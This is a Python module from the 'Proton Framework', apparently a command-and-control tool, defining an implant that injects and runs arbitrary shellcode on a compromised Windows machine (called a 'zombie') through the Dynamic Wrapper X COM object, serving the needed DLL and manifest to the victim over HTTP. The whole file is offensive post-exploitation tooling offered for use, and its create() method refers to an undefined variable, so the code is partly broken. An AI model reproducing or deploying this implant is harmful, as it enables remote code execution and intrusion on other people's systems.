#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.implant
import core.job
import string
import uuid

class DynWrapXShellcodeJob(core.job.Job):
    def create(self):
        self.fork32Bit = True
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHELLCODEDECCSV", self.convert_shellcode(shellcode))
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def report(self, handler, data, sanitize = False):
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("DYNWRAPXDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
            return

        super(DynWrapXShellcodeJob, self).report(handler, data)

    def done(self):
        self.results = "Cpmpleted"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class DynWrapXShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Dynamic Wrapper X"
    DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/inject/shellcode_dynwrapx"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on zombie.", required=False)

        self.options.register("SHELLCODE", "90c3", "Shellcode ASCII hex.", required=True)
        self.options.register("SHELLCODEDECCSV", "", "Decimal CSV shellcode.", hidden=True)

        self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "Relative path to dynwrapx.dll.", required=True, advanced=True)
        self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "Relative path to dynwrapx.manifest.", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID.", advanced=True)

        self.options.register("DLLUUID", "ETag", "HTTP header for UUID.", hidden=True)
        self.options.register("MANIFESTUUID", "ETag", "HTTP header for UUID.", hidden=True)

    def job(self):
        return DynWrapXShellcodeJob

    def run(self):
        shellcode = self.options.get("SHELLCODE")

        if not self.validate_shellcode(shellcode):
            self.shell.print_error("SHELLCODE option is an invalid hex string!")
            return

        #vba = self.loader.load_script("data/implant/inject/shellcode.vba", self.options)
        #vba = vba.decode().replace("\n", "\\n")

        #self.options.set("VBACODE", vba)

        workloads = {}
        workloads["js"] = "data/implant/inject/shellcode_dynwrapx.js"

        self.dispatch(workloads, self.job)
